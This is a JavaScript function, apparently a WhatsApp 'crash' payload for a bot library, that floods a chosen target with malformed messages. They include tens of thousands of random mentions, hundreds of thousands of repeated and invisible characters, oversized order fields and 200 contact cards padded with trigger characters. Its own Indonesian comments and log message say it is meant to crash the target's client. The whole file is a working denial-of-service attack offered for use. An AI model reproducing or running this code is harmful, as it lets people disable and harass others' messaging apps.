async function ditthtzyCrashInvis(sock, target) {
  try {
    const ditthMentionsAI = [
      "13135550001@s.whatsapp.net","13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net","13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net","13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net","13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net","13135550010@s.whatsapp.net"
    ];

    const ditthMetaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const ditthTextSpam = "᬴".repeat(250000);
    const ditthMentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const ditthInvisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const ditthContactName = "🩸⃟ ༚ ditthtzy ⌁ 𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const ditthTriggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const ditthContactAmount = 200;
    const ditthRandomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    // kirim orderMessage
    await sock.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: ditthContactName,
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "ditthtzyToken==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...ditthMentionsAI, ...ditthMetaSpam]
        }
      }
    });

    // kirim spam text
    await sock.sendMessage(target, {
      text: ditthTextSpam,
      contextInfo: { mentionedJid: ditthMentionSpam }
    });

    // invisible message
    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: { locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 }, hasMediaAttachment: true },
            body: { text: ditthInvisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: ditthRandomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: ditthRandomMentions,
            contextInfo: { mentionedJid: ditthRandomMentions }
          }
        }
      }
    });

    // kontak spam
    const ditthContacts = Array.from({ length: ditthContactAmount }, () => ({
      displayName: `${ditthContactName + ditthTriggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${ditthContactName};;;\nFN:${ditthContactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await sock.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${ditthContactName + ditthTriggerChar}`,
        contacts: ditthContacts
      }
    });

    console.log("✅ Crash ditthtzy berhasil dikirim ke target!");
  } catch (err) {
    console.error("❌ Error di function ditthtzyCrashInvis:", err);
  }
}